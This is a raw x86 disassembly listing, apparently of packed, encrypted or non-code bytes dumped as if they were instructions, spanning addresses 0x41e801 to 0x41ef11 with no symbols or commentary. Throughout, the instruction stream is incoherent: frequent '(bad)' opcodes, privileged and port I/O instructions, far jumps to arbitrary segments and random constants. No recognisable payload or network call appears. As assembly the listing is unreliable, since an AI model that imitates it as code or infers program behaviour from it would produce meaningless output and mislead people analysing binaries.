  41e801:	mov    eax,ds:0xb45fd049
  41e806:	xor    al,0x2a
  41e808:	icebp  
  41e809:	mov    cl,0x3d
  41e80b:	sbb    BYTE PTR [eax+0x33],bh
  41e80e:	ds (bad) 
  41e810:	sub    al,0xbe
  41e812:	shl    DWORD PTR [ebp+0x4f],1
  41e815:	xlat   BYTE PTR ds:[ebx]
  41e816:	adc    eax,0x31a99dec
  41e81b:	rcl    al,cl
  41e81d:	xchg   ecx,eax
  41e81e:	or     esp,DWORD PTR [edi+0x7568ca4c]
  41e824:	sub    BYTE PTR [ecx+0x31],0xa4
  41e828:	mov    ds:0xfc7363f,eax
  41e82d:	jmp    0x746:0xaf0e93e4
  41e834:	iret   
  41e835:	pop    ecx
  41e836:	es (bad) 
  41e838:	mov    ecx,0x58597255
  41e83d:	xchg   ebp,eax
  41e83e:	sub    al,bh
  41e840:	cwde   
  41e841:	loope  0x41e8a3
  41e843:	push   es
  41e844:	retf   0x60fe
  41e847:	retf   
  41e848:	stos   DWORD PTR es:[edi],eax
  41e849:	bound  esp,QWORD PTR [ebp-0x13]
  41e84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e84d:	sub    BYTE PTR [edx+0x12],dh
  41e850:	add    bl,dh
  41e852:	int    0x3c
  41e854:	out    0x1e,eax
  41e856:	pop    eax
  41e857:	xor    BYTE PTR [ebx-0x16238503],dl
  41e85d:	cdq    
  41e85e:	add    eax,0x3ddc44b0
  41e863:	pop    edx
  41e864:	adc    al,0x54
  41e866:	into   
  41e867:	fstp   QWORD PTR [ebx-0x3083d00c]
  41e86d:	xor    ch,BYTE PTR [ecx+0x58cd14cd]
  41e873:	fmul   DWORD PTR [ebx]
  41e875:	mov    esp,0x29380ec8
  41e87a:	std    
  41e87b:	jecxz  0x41e828
  41e87d:	cmp    al,0x7
  41e87f:	(bad)  
  41e880:	in     al,0xb7
  41e882:	les    esp,FWORD PTR [edi-0x1e0663dd]
  41e888:	push   cs
  41e889:	xor    ah,ch
  41e88b:	enter  0x149c,0x61
  41e88f:	fbstp  TBYTE PTR [eax+0x7d]
  41e892:	push   ds
  41e893:	daa    
  41e894:	pop    ebx
  41e895:	mov    dl,bh
  41e897:	repz adc bl,0xf3
  41e89b:	or     DWORD PTR [esi+0x7c],edx
  41e89e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e89f:	jae    0x41e847
  41e8a1:	xor    DWORD PTR [edi+eax*2+0x3],eax
  41e8a5:	test   eax,0xedc5b07b
  41e8aa:	mov    dl,bl
  41e8ac:	mov    ch,0xba
  41e8ae:	inc    esp
  41e8af:	push   cs
  41e8b0:	lods   eax,DWORD PTR ds:[esi]
  41e8b1:	mov    dh,0x46
  41e8b3:	jns    0x41e886
  41e8b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8b6:	sbb    ebp,DWORD PTR [eax]
  41e8b8:	or     al,0xc3
  41e8ba:	sti    
  41e8bb:	jle    0x41e8df
  41e8bd:	push   0x7b2b84be
  41e8c2:	push   ebp
  41e8c3:	dec    BYTE PTR [ebp+0x57]
  41e8c6:	xchg   edi,eax
  41e8c7:	mov    ds:0x5d3ace29,al
  41e8cc:	xlat   BYTE PTR ds:[ebx]
  41e8cd:	inc    ebp
  41e8ce:	cmp    BYTE PTR [ecx],bh
  41e8d0:	pop    esp
  41e8d1:	or     edx,DWORD PTR [ebx+0x663a0c00]
  41e8d7:	adc    edx,ebx
  41e8d9:	dec    eax
  41e8da:	fsub   DWORD PTR [ebx-0x69aa0921]
  41e8e0:	adc    DWORD PTR [ebx+ebp*2],edi
  41e8e3:	loopne 0x41e8c4
  41e8e5:	dec    ebx
  41e8e6:	data16 ja 0x41e92f
  41e8e9:	sbb    BYTE PTR [edx+0x41],dl
  41e8ec:	and    ebp,DWORD PTR [ebp+0x6dd83abc]
  41e8f2:	pushf  
  41e8f3:	mov    edi,0x1ae22e67
  41e8f8:	mov    bh,BYTE PTR [esi-0x1ae09a61]
  41e8fe:	shl    DWORD PTR [eax+edi*2-0xaf00a4c],1
  41e905:	nop
  41e906:	mov    ch,0x4d
  41e908:	data16 cli 
  41e90a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e90b:	mov    ah,0xa6
  41e90d:	xor    bl,BYTE PTR [ebx+0x5f]
  41e910:	mov    BYTE PTR [edi+0x76578b91],dh
  41e916:	test   edx,ecx
  41e918:	iret   
  41e919:	sub    bl,BYTE PTR [edx+0x3c55af97]
  41e91f:	es push 0x5f6bbe78
  41e925:	mov    BYTE PTR [edx+0x17],ch
  41e928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e929:	inc    ecx
  41e92a:	mov    ch,0xd7
  41e92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e92d:	mov    edx,0x40eb4027
  41e932:	mov    bl,0x43
  41e934:	cld    
  41e935:	xchg   esp,eax
  41e936:	nop
  41e937:	cmp    DWORD PTR [eax],ebx
  41e939:	jns    0x41e987
  41e93b:	scas   al,BYTE PTR es:[edi]
  41e93c:	or     esp,ebx
  41e93e:	stos   DWORD PTR es:[edi],eax
  41e93f:	js     0x41e913
  41e941:	jbe    0x41e96c
  41e943:	pop    ebx
  41e944:	cmp    dh,BYTE PTR [edx-0x5253d42c]
  41e94a:	push   cs
  41e94b:	loope  0x41e984
  41e94d:	xchg   ebx,eax
  41e94e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e94f:	(bad)  
  41e951:	jnp    0x41e8ec
  41e953:	(bad)  
  41e954:	cdq    
  41e955:	or     BYTE PTR [esi-0x2d],cl
  41e958:	adc    eax,0xf4ef7919
  41e95d:	aam    0x7d
  41e95f:	jae    0x41e99e
  41e961:	mov    al,ds:0x524e765d
  41e966:	add    ah,al
  41e968:	jmp    0x272bf089
  41e96d:	xchg   esi,eax
  41e96e:	test   eax,0x4890e3e0
  41e973:	fistp  QWORD PTR [eax]
  41e975:	ret    0x136f
  41e978:	repz and bh,cl
  41e97b:	and    BYTE PTR ds:0xa7a2a8e2,dl
  41e981:	test   BYTE PTR ds:0x1178b216,0xad
  41e988:	mov    ch,0x95
  41e98a:	mov    eax,0xa213ffee
  41e98f:	lea    esp,[eax-0x5ab851d7]
  41e995:	sub    al,ch
  41e997:	add    eax,0x46d29fb3
  41e99c:	mov    ds:0x5895bf5b,eax
  41e9a1:	scas   al,BYTE PTR es:[edi]
  41e9a2:	dec    ebp
  41e9a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9a4:	pop    ecx
  41e9a5:	aam    0x5d
  41e9a7:	into   
  41e9a8:	lds    edx,FWORD PTR [esi]
  41e9aa:	dec    ebp
  41e9ab:	loope  0x41e94d
  41e9ad:	imul   ecx,esp,0xffffffc0
  41e9b0:	xchg   ebx,eax
  41e9b1:	dec    edx
  41e9b2:	sbb    BYTE PTR [edx-0x22ac927e],ah
  41e9b8:	cs lock in al,0x6f
  41e9bc:	sub    bl,BYTE PTR fs:[edi]
  41e9bf:	or     al,0xf9
  41e9c1:	loopne 0x41e975
  41e9c3:	jg     0x41e9a8
  41e9c5:	outs   dx,DWORD PTR ds:[esi]
  41e9c6:	imul   eax,DWORD PTR [edx],0xffffff8c
  41e9c9:	sbb    eax,0xdd2af4bb
  41e9ce:	or     edi,eax
  41e9d0:	shl    BYTE PTR [ebx+0x58ccb43f],1
  41e9d6:	ins    BYTE PTR es:[edi],dx
  41e9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d8:	shl    dl,0x9c
  41e9db:	popf   
  41e9dc:	mov    esi,DWORD PTR [ecx-0x2e94537a]
  41e9e2:	stos   BYTE PTR es:[edi],al
  41e9e3:	xor    BYTE PTR [ecx-0x13dbcb6f],al
  41e9e9:	popf   
  41e9ea:	mov    ah,0x6e
  41e9ec:	cwde   
  41e9ed:	inc    ebp
  41e9ee:	dec    edx
  41e9ef:	ins    BYTE PTR es:[edi],dx
  41e9f0:	pusha  
  41e9f1:	inc    esp
  41e9f2:	sbb    eax,0xbb2a4f50
  41e9f7:	xchg   esi,eax
  41e9f8:	les    ecx,FWORD PTR [edx-0x6bb8f03c]
  41e9fe:	hlt    
  41e9ff:	ret    0x4dc4
  41ea02:	stos   DWORD PTR es:[edi],eax
  41ea03:	inc    ecx
  41ea04:	pop    eax
  41ea05:	jp     0x41e9f0
  41ea07:	(bad)  
  41ea08:	repz fwait
  41ea0a:	mov    bh,0x3
  41ea0c:	xchg   ebp,eax
  41ea0d:	jnp    0x41ea84
  41ea0f:	addr16 and al,0xac
  41ea12:	xor    al,0xa3
  41ea14:	lods   eax,DWORD PTR ds:[esi]
  41ea15:	xchg   esi,eax
  41ea16:	push   esp
  41ea17:	out    0x33,al
  41ea19:	scas   eax,DWORD PTR es:[edi]
  41ea1a:	ror    ecx,cl
  41ea1c:	sbb    eax,0x124d122f
  41ea21:	push   0x77289381
  41ea26:	pop    DWORD PTR [ebx+0x3a]
  41ea29:	(bad)  
  41ea2a:	mov    dh,0x2f
  41ea2c:	sbb    BYTE PTR ds:0xbb557541,cl
  41ea32:	pop    esp
  41ea33:	sbb    cl,BYTE PTR [ecx+0x280a8a8d]
  41ea39:	mov    cl,0xc9
  41ea3b:	push   ebp
  41ea3c:	jge    0x41ea66
  41ea3e:	push   eax
  41ea3f:	mov    esi,DWORD PTR [edi-0x18]
  41ea42:	rol    eax,0xf5
  41ea45:	sbb    eax,0x29f1f353
  41ea4a:	inc    eax
  41ea4b:	ins    BYTE PTR es:[edi],dx
  41ea4c:	xlat   BYTE PTR ds:[ebx]
  41ea4d:	stos   DWORD PTR es:[edi],eax
  41ea4e:	nop
  41ea4f:	mov    ebx,0x5ab5897c
  41ea54:	fld    TBYTE PTR [edx-0x60]
  41ea57:	mov    edx,0xcc7d7caa
  41ea5c:	cdq    
  41ea5d:	gs hlt 
  41ea5f:	es test ebx,esp
  41ea62:	push   edx
  41ea63:	inc    edx
  41ea64:	ss out dx,eax
  41ea66:	ds pop esp
  41ea68:	int3   
  41ea69:	(bad)  [ecx]
  41ea6b:	adc    esi,DWORD PTR [ebx-0xd9a0167]
  41ea71:	(bad)  
  41ea73:	sbb    edi,ecx
  41ea75:	mov    cl,BYTE PTR [esi]
  41ea77:	mov    eax,ds:0x7e3098c4
  41ea7c:	mov    al,ds:0x81d65132
  41ea82:	aaa    
  41ea83:	add    eax,0x41c5ec
  41ea88:	xor    al,0x4
  41ea8a:	lds    esp,FWORD PTR [ebp+ebx*1-0x3f768833]
  41ea91:	push   ecx
  41ea92:	sbb    al,0xf5
  41ea94:	jbe    0x41eb04
  41ea96:	push   0xffffffdb
  41ea98:	xor    DWORD PTR [edi],ebp
  41ea9a:	outs   dx,DWORD PTR ds:[esi]
  41ea9b:	retf   0xdc04
  41ea9e:	es sbb esp,eax
  41eaa1:	lahf   
  41eaa2:	pop    ebx
  41eaa3:	lods   al,BYTE PTR ds:[esi]
  41eaa4:	iret   
  41eaa5:	(bad)  
  41eaa7:	mov    bh,0x27
  41eaa9:	fstp   QWORD PTR [edx+0x82285c6]
  41eaaf:	ficom  WORD PTR [ebp+0x22]
  41eab2:	push   eax
  41eab3:	or     DWORD PTR [ebx],0xffffff9a
  41eab6:	jo     0x41eabf
  41eab8:	mov    DWORD PTR [esi+0x2586b87c],esi
  41eabe:	xor    eax,0x5afd6ec2
  41eac3:	sbb    cl,BYTE PTR [edi+0x6cf26771]
  41eac9:	or     DWORD PTR [eax+ebx*2],esp
  41eacc:	mov    ds,WORD PTR [edx+0x10d71b29]
  41ead2:	mov    edx,0xac44a8a9
  41ead7:	push   0xffffffb6
  41ead9:	fsubr  DWORD PTR [edx-0x6a]
  41eadc:	or     dl,bl
  41eade:	push   edi
  41eadf:	pop    esi
  41eae0:	js     0x41eb12
  41eae2:	aam    0xa6
  41eae4:	repnz xor BYTE PTR [edx-0x52],bl
  41eae8:	test   DWORD PTR es:[ebx+0x70],0xf33aadd0
  41eaf0:	lea    ebx,[edi-0x14446469]
  41eaf6:	mov    ds:0x64e010aa,al
  41eafb:	aas    
  41eafc:	jge    0x41ea8a
  41eafe:	or     al,0x42
  41eb00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb01:	and    ebp,ebp
  41eb03:	aaa    
  41eb04:	sahf   
  41eb05:	in     al,0xf6
  41eb07:	mov    ecx,0x5cc5e102
  41eb0c:	cwde   
  41eb0d:	dec    ebx
  41eb0e:	out    dx,al
  41eb0f:	cdq    
  41eb10:	je     0x41eaee
  41eb12:	xchg   BYTE PTR [edi],al
  41eb14:	or     eax,0xee244a19
  41eb19:	xor    BYTE PTR [esi+ecx*4-0x20ead237],cl
  41eb20:	pop    esi
  41eb21:	test   DWORD PTR [edi+esi*8+0x79d35cae],ebp
  41eb28:	scas   eax,DWORD PTR es:[edi]
  41eb29:	sub    ch,BYTE PTR [ecx]
  41eb2b:	push   cs
  41eb2c:	mov    al,BYTE PTR [esi]
  41eb2e:	fwait
  41eb2f:	ins    DWORD PTR es:[edi],dx
  41eb30:	mov    BYTE PTR [ebx],ah
  41eb32:	je     0x41eb67
  41eb34:	xchg   esi,eax
  41eb35:	pop    edi
  41eb36:	int3   
  41eb37:	push   ebx
  41eb38:	push   ecx
  41eb39:	mov    esp,0x4f13422e
  41eb3e:	and    eax,0x6ffd5090
  41eb43:	push   ds
  41eb44:	cmp    DWORD PTR [ebx+ecx*4+0x4dd294a9],esp
  41eb4b:	dec    ecx
  41eb4c:	stc    
  41eb4d:	out    0x74,al
  41eb4f:	mov    edi,0xf65ffd8a
  41eb54:	fild   WORD PTR [ebp-0x18]
  41eb57:	xchg   esi,ebx
  41eb59:	mov    edi,0x8f80016a
  41eb5e:	fdivr  QWORD PTR [edx+0x7d]
  41eb61:	mov    eax,0x956b3104
  41eb66:	jne    0x41ebd7
  41eb68:	sbb    BYTE PTR [esp+edi*8+0x19ca1b5],cl
  41eb6f:	stos   BYTE PTR es:[edi],al
  41eb70:	xchg   esp,eax
  41eb71:	out    dx,al
  41eb72:	pop    es
  41eb73:	je     0x41ebaa
  41eb75:	inc    ebp
  41eb76:	lahf   
  41eb77:	push   esi
  41eb78:	xor    al,0x3e
  41eb7a:	dec    edx
  41eb7b:	pop    ss
  41eb7c:	mov    eax,ds:0x92514b44
  41eb81:	test   al,0xd1
  41eb83:	popf   
  41eb84:	fsub   DWORD PTR [eax]
  41eb86:	rcr    DWORD PTR ds:0x62cdbf9e,0xc3
  41eb8d:	push   edx
  41eb8e:	add    bh,BYTE PTR [ebp+0x1d519798]
  41eb94:	inc    eax
  41eb95:	dec    ebx
  41eb96:	ret    0xd4fe
  41eb99:	mov    bh,0x77
  41eb9b:	test   al,0x53
  41eb9d:	cli    
  41eb9e:	daa    
  41eb9f:	(bad)  [ecx]
  41eba1:	pop    ecx
  41eba2:	fs (bad) 
  41eba4:	out    dx,eax
  41eba5:	xchg   BYTE PTR [edx],al
  41eba7:	xor    DWORD PTR [ebp+0x2e],0xbbf896d1
  41ebae:	xchg   ecx,eax
  41ebaf:	cwde   
  41ebb0:	shl    DWORD PTR fs:[edx],1
  41ebb3:	cmc    
  41ebb4:	fwait
  41ebb5:	sbb    eax,DWORD PTR [ebx+0x71]
  41ebb8:	cmp    dh,BYTE PTR [edx]
  41ebba:	mov    eax,esi
  41ebbc:	stc    
  41ebbd:	cwde   
  41ebbe:	add    DWORD PTR [eax-0x59588b90],esp
  41ebc4:	scas   al,BYTE PTR es:[edi]
  41ebc5:	rol    DWORD PTR [edx+0x6f],cl
  41ebc8:	mov    ds:0x6472a30a,al
  41ebcd:	mov    cs:0x8b4f1ef9,eax
  41ebd3:	push   DWORD PTR [ebx+0x2e]
  41ebd6:	sbb    al,0x12
  41ebd8:	push   edi
  41ebd9:	in     al,dx
  41ebda:	(bad)  
  41ebdd:	sti    
  41ebde:	shl    DWORD PTR [ebp-0x3c32bcf9],1
  41ebe4:	xor    DWORD PTR [ecx+0x36],esi
  41ebe7:	lods   eax,DWORD PTR ds:[esi]
  41ebe8:	dec    dx
  41ebea:	ja     0x41ebe4
  41ebec:	mov    DWORD PTR [ecx-0x2b48cd28],esp
  41ebf2:	rcr    DWORD PTR [edx-0x6c],cl
  41ebf5:	push   ebp
  41ebf6:	outs   dx,BYTE PTR ds:[esi]
  41ebf7:	pop    ss
  41ebf8:	ret    
  41ebf9:	jmp    0x37fe989a
  41ebfe:	push   ds
  41ebff:	inc    ecx
  41ec00:	int3   
  41ec01:	daa    
  41ec02:	mov    ebp,0x28c30f93
  41ec07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec08:	dec    ecx
  41ec09:	and    edx,0xffffffa9
  41ec0c:	fsub   QWORD PTR [ebp-0x79]
  41ec0f:	xor    dh,BYTE PTR [ebx-0x1ef1c7fa]
  41ec15:	inc    edx
  41ec16:	lods   al,BYTE PTR ds:[esi]
  41ec17:	dec    ebx
  41ec18:	(bad)  
  41ec19:	(bad)  
  41ec1a:	hlt    
  41ec1b:	(bad)  
  41ec1c:	cmp    BYTE PTR [eax+ecx*4-0x53],ah
  41ec20:	out    0x3c,eax
  41ec22:	dec    edi
  41ec23:	div    edx
  41ec25:	dec    edi
  41ec26:	call   0x7afc5987
  41ec2b:	add    al,0x7e
  41ec2d:	inc    esp
  41ec2e:	pop    es
  41ec2f:	cdq    
  41ec30:	shr    DWORD PTR [ecx-0x55aa4a17],0x2e
  41ec37:	ror    BYTE PTR [ebp-0x88ad02d],0x9e
  41ec3e:	daa    
  41ec3f:	test   DWORD PTR es:[ebx+0x5f],edx
  41ec43:	gs mov ecx,ebp
  41ec46:	call   0x92500bc1
  41ec4b:	xor    bl,dh
  41ec4d:	(bad)  
  41ec4f:	test   eax,0x9ef406eb
  41ec54:	adc    BYTE PTR [ecx],dh
  41ec56:	mov    cl,0xce
  41ec58:	cmp    DWORD PTR [eax],0x2ecb23ff
  41ec5e:	fist   DWORD PTR [ebp+0x48ff0f21]
  41ec64:	andps  xmm5,XMMWORD PTR [ebx+0x14460d17]
  41ec6b:	xchg   edx,edi
  41ec6d:	sub    BYTE PTR [esi-0x52],dh
  41ec70:	imul   edx,DWORD PTR [ebx+0x51],0xffffffae
  41ec74:	mov    eax,ds:0x22e68866
  41ec79:	mov    esi,0x53f98ad7
  41ec7e:	push   0x5b
  41ec80:	jmp    0x41eca2
  41ec82:	cmove  esi,ecx
  41ec85:	outs   dx,BYTE PTR ds:[esi]
  41ec86:	push   0x4c692c9f
  41ec8b:	xor    al,0x2a
  41ec8d:	dec    ecx
  41ec8e:	mov    ecx,ss
  41ec90:	sar    BYTE PTR [ecx+0x3a],cl
  41ec93:	loope  0x41ecc0
  41ec95:	jo     0x41ecf3
  41ec97:	mov    ebx,ss
  41ec99:	out    dx,eax
  41ec9a:	cmc    
  41ec9b:	mov    al,ds:0xe2dca879
  41eca0:	and    esi,DWORD PTR [eax-0x56]
  41eca3:	adc    dh,BYTE PTR [ebx+edi*1]
  41eca6:	sub    dl,BYTE PTR [ebx+ebx*1+0x5c]
  41ecaa:	add    eax,0xe73e433f
  41ecaf:	cmp    al,0xc5
  41ecb1:	out    0x16,al
  41ecb3:	adc    DWORD PTR [edx+ebp*1],edi
  41ecb6:	test   DWORD PTR [ebp-0x2749eaad],ebp
  41ecbc:	fdivrp st(2),st
  41ecbe:	pop    esp
  41ecbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecc0:	es ret 0x48b8
  41ecc4:	jae    0x41ece6
  41ecc6:	xor    al,0x51
  41ecc8:	js     0x41ed3a
  41ecca:	in     eax,0x25
  41eccc:	jb     0x41ec8b
  41ecce:	test   eax,0x6e488ad6
  41ecd3:	xchg   esi,eax
  41ecd4:	loop   0x41ecec
  41ecd6:	cmp    DWORD PTR [esi+esi*1+0xe168d43],0xffffffb2
  41ecde:	cmc    
  41ecdf:	lods   al,BYTE PTR ds:[esi]
  41ece0:	sahf   
  41ece1:	push   cs
  41ece2:	cdq    
  41ece3:	scas   al,BYTE PTR es:[edi]
  41ece4:	fdiv   QWORD PTR [edi+0x4d]
  41ece7:	or     BYTE PTR [esi+0x3bd4e24c],dh
  41eced:	jl     0x41ed5f
  41ecef:	setp   BYTE PTR [esi+0x7971d736]
  41ecf6:	adc    ch,cl
  41ecf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecf9:	jp     0x41ed38
  41ecfb:	js     0x41ed09
  41ecfd:	xchg   BYTE PTR [ecx],cl
  41ecff:	jb     0x41ecbf
  41ed01:	test   al,0xc4
  41ed03:	push   esi
  41ed04:	or     BYTE PTR [esi],dl
  41ed06:	xor    ch,al
  41ed08:	or     edx,DWORD PTR [esp+ebp*2-0x3e8bb90f]
  41ed0f:	mov    ebp,0xdc74c00f
  41ed14:	(bad)  
  41ed15:	popf   
  41ed16:	jle    0x41ed4c
  41ed18:	jb     0x41ecff
  41ed1a:	xor    bh,al
  41ed1c:	ss xchg ebp,eax
  41ed1e:	(bad)  
  41ed1f:	call   FWORD PTR [eax-0xe]
  41ed22:	cli    
  41ed23:	ja     0x41ed15
  41ed25:	cmp    edi,0x313f3880
  41ed2b:	or     eax,0x1301abe1
  41ed30:	push   edi
  41ed31:	(bad)  
  41ed32:	fidivr WORD PTR [edx-0x1bdd9f01]
  41ed38:	outs   dx,BYTE PTR ds:[esi]
  41ed39:	pop    eax
  41ed3a:	adc    ebx,ebp
  41ed3c:	and    BYTE PTR ds:0x2d989655,0x61
  41ed43:	push   ecx
  41ed44:	cmp    esp,ecx
  41ed46:	lahf   
  41ed47:	add    ah,ch
  41ed49:	pop    esp
  41ed4a:	aad    0x97
  41ed4c:	cli    
  41ed4d:	or     dl,al
  41ed4f:	imul   ecx,ebx,0x7c
  41ed52:	dec    ebp
  41ed53:	sar    DWORD PTR [eax],0xbb
  41ed56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed57:	adc    BYTE PTR [eax-0x36],ah
  41ed5a:	pusha  
  41ed5b:	test   BYTE PTR [ebp-0x6e],ah
  41ed5e:	jmp    0x41ed62
  41ed60:	or     esp,DWORD PTR [ecx-0x46]
  41ed63:	sbb    edi,DWORD PTR [edx-0x67]
  41ed66:	push   ss
  41ed67:	nop
  41ed68:	or     DWORD PTR [eax-0x1],eax
  41ed6b:	(bad)  
  41ed6c:	in     al,0x6f
  41ed6e:	mov    BYTE PTR [ecx],ch
  41ed70:	dec    ecx
  41ed71:	in     eax,0x18
  41ed73:	xor    BYTE PTR [edx+0x74],0x9f
  41ed77:	es xchg ecx,eax
  41ed79:	daa    
  41ed7a:	das    
  41ed7b:	pop    eax
  41ed7c:	fwait
  41ed7d:	int3   
  41ed7e:	div    BYTE PTR [edi]
  41ed80:	push   ds
  41ed81:	adc    edi,DWORD PTR [eax+esi*1-0x71]
  41ed85:	popa   
  41ed86:	and    edi,esp
  41ed88:	push   ebp
  41ed89:	jg     0x41ed5c
  41ed8b:	push   ebx
  41ed8c:	aaa    
  41ed8d:	cmc    
  41ed8e:	push   es
  41ed8f:	into   
  41ed90:	and    eax,0x8ec8d61d
  41ed95:	lods   eax,DWORD PTR ds:[esi]
  41ed96:	ret    0xcf9e
  41ed99:	mov    dh,0x32
  41ed9b:	dec    eax
  41ed9c:	int3   
  41ed9d:	fld    DWORD PTR [edx-0x42568f60]
  41eda3:	fnstcw WORD PTR ds:0x193e7380
  41eda9:	or     dl,dl
  41edab:	fsub   st,st(0)
  41edad:	dec    esi
  41edae:	loopne 0x41ee01
  41edb0:	xor    al,0xf1
  41edb2:	je     0x41ee29
  41edb4:	dec    ebx
  41edb5:	cmp    eax,0xba92994d
  41edba:	fwait
  41edbb:	add    DWORD PTR [ebx-0x63],ebx
  41edbe:	(bad)  
  41edbf:	jbe    0x41ee01
  41edc1:	inc    ebx
  41edc2:	adc    eax,0xcd994bd0
  41edc7:	jecxz  0x41edac
  41edc9:	loop   0x41ed99
  41edcb:	enter  0x786c,0x13
  41edcf:	xchg   ebp,eax
  41edd0:	xchg   ecx,eax
  41edd1:	daa    
  41edd2:	mov    bh,BYTE PTR [eax]
  41edd4:	idiv   DWORD PTR [esp+ebp*8-0x6f]
  41edd8:	fdivr  QWORD PTR [edi]
  41edda:	gs dec esp
  41eddc:	iret   
  41eddd:	ins    BYTE PTR es:[edi],dx
  41edde:	mov    BYTE PTR [esi+0x6b],dl
  41ede1:	rcl    DWORD PTR [edx-0x5a],1
  41ede4:	mov    dl,0x83
  41ede6:	xchg   ebx,eax
  41ede7:	ja     0x41ed6f
  41ede9:	int    0xa1
  41edeb:	sbb    BYTE PTR [ecx+ebp*2-0x2],0x6e
  41edf0:	in     eax,dx
  41edf1:	push   edx
  41edf2:	shl    BYTE PTR [ebp-0x22a7add0],0x46
  41edf9:	int3   
  41edfa:	daa    
  41edfb:	push   ebp
  41edfc:	test   eax,0x8934fecb
  41ee01:	sbb    bl,BYTE PTR [edi+0x3ac94a66]
  41ee07:	les    esp,FWORD PTR [edx-0x5f]
  41ee0a:	jle    0x41edce
  41ee0c:	xchg   ebx,eax
  41ee0d:	(bad)  
  41ee0e:	(bad)  
  41ee11:	pushf  
  41ee12:	scas   al,BYTE PTR es:[edi]
  41ee13:	fcmovbe st,st(6)
  41ee15:	jmp    0x41ee87
  41ee17:	sbb    BYTE PTR [ecx+0x79],dh
  41ee1a:	sar    DWORD PTR ds:0xe66266dc,1
  41ee20:	xchg   edi,eax
  41ee21:	mov    ah,0xcf
  41ee23:	test   BYTE PTR ds:0x41becd9e,ch
  41ee29:	(bad)  
  41ee2a:	push   esp
  41ee2b:	jo     0x41ee55
  41ee2d:	or     al,0xd9
  41ee2f:	pop    ds
  41ee30:	lock rol DWORD PTR [esi],1
  41ee33:	in     eax,dx
  41ee34:	xchg   cl,ch
  41ee36:	shl    bl,0x33
  41ee39:	mov    cl,0x91
  41ee3b:	lock and DWORD PTR [ebp-0x5a],edi
  41ee3f:	outs   dx,DWORD PTR ds:[esi]
  41ee40:	add    bh,BYTE PTR [edi-0xc]
  41ee43:	rol    esp,1
  41ee45:	fdivr  DWORD PTR [edx-0x46d6cec6]
  41ee4b:	xchg   edx,eax
  41ee4c:	mov    ds:0x99492a65,al
  41ee51:	ds stos BYTE PTR es:[edi],al
  41ee53:	sbb    dh,dl
  41ee55:	lock pop ebx
  41ee57:	mov    dh,0xf9
  41ee59:	icebp  
  41ee5a:	mov    eax,0x35ca5d06
  41ee5f:	push   ecx
  41ee60:	mov    eax,ds:0x8bc93c5e
  41ee65:	stc    
  41ee66:	dec    esp
  41ee67:	jne    0x41eedf
  41ee69:	in     eax,dx
  41ee6a:	inc    ecx
  41ee6b:	pop    esi
  41ee6c:	lahf   
  41ee6d:	mov    ah,0xef
  41ee6f:	add    cl,BYTE PTR [edx+0x71]
  41ee72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee73:	add    eax,0x22b33523
  41ee78:	xchg   esi,eax
  41ee79:	stos   DWORD PTR es:[edi],eax
  41ee7a:	xchg   ecx,eax
  41ee7b:	imul   ebp,DWORD PTR [edi+0x31],0x6ee30298
  41ee82:	das    
  41ee83:	mov    eax,0x39660b1b
  41ee88:	into   
  41ee89:	push   ecx
  41ee8a:	xchg   esi,eax
  41ee8b:	adc    BYTE PTR [edx],ah
  41ee8d:	icebp  
  41ee8e:	iret   
  41ee8f:	xchg   edi,eax
  41ee90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee91:	ins    BYTE PTR es:[edi],dx
  41ee92:	sti    
  41ee93:	lea    ebp,[edx-0x12]
  41ee96:	or     eax,0xc87ddff1
  41ee9b:	inc    esi
  41ee9c:	sub    BYTE PTR [edi],bl
  41ee9e:	std    
  41ee9f:	adc    DWORD PTR [ebx-0x13],esp
  41eea2:	cmc    
  41eea3:	clc    
  41eea4:	mov    esi,0xfe366fa1
  41eea9:	pop    ecx
  41eeaa:	mov    eax,ds:0x1b0caa91
  41eeaf:	(bad)  
  41eeb0:	jge    0x41ef1a
  41eeb2:	jno    0x41ee91
  41eeb4:	add    ah,bh
  41eeb6:	pusha  
  41eeb7:	push   ss
  41eeb8:	(bad)  
  41eeb9:	push   eax
  41eeba:	fs jmp 0xbd17b77c
  41eec0:	adc    ecx,DWORD PTR [edi]
  41eec2:	js     0x41eee6
  41eec4:	adc    eax,0xfcf4a3cc
  41eec9:	rcl    DWORD PTR [eax-0x66982d50],cl
  41eecf:	mov    edx,0x25f6cde6
  41eed4:	xchg   esp,eax
  41eed5:	clc    
  41eed6:	fld    DWORD PTR [esi]
  41eed8:	mov    cl,0xac
  41eeda:	sbb    BYTE PTR [edi-0x6b],dh
  41eedd:	pop    ss
  41eede:	xchg   edx,eax
  41eedf:	sub    ch,BYTE PTR [ebp+eax*1-0x7fc2f5ec]
  41eee6:	xchg   ecx,eax
  41eee7:	aas    
  41eee8:	adc    ah,BYTE PTR [edi-0xeb6c050]
  41eeee:	pop    edi
  41eeef:	lss    esp,FWORD PTR [ebx]
  41eef2:	ret    
  41eef3:	dec    esp
  41eef4:	retf   0x4e97
  41eef7:	cld    
  41eef8:	leave  
  41eef9:	xchg   ebx,eax
  41eefa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eefb:	inc    ebp
  41eefc:	cld    
  41eefd:	in     eax,dx
  41eefe:	test   BYTE PTR [ebp-0x40c4d56a],dl
  41ef04:	lahf   
  41ef05:	mov    ch,0x6c
  41ef07:	xchg   ebp,eax
  41ef08:	pop    ebp
  41ef09:	iret   
  41ef0a:	fistp  QWORD PTR [eax+0x6ef416f0]
  41ef10:	cmc    
  41ef11:	add    esi,DWORD PTR [eax-0x6e6f1e6f]
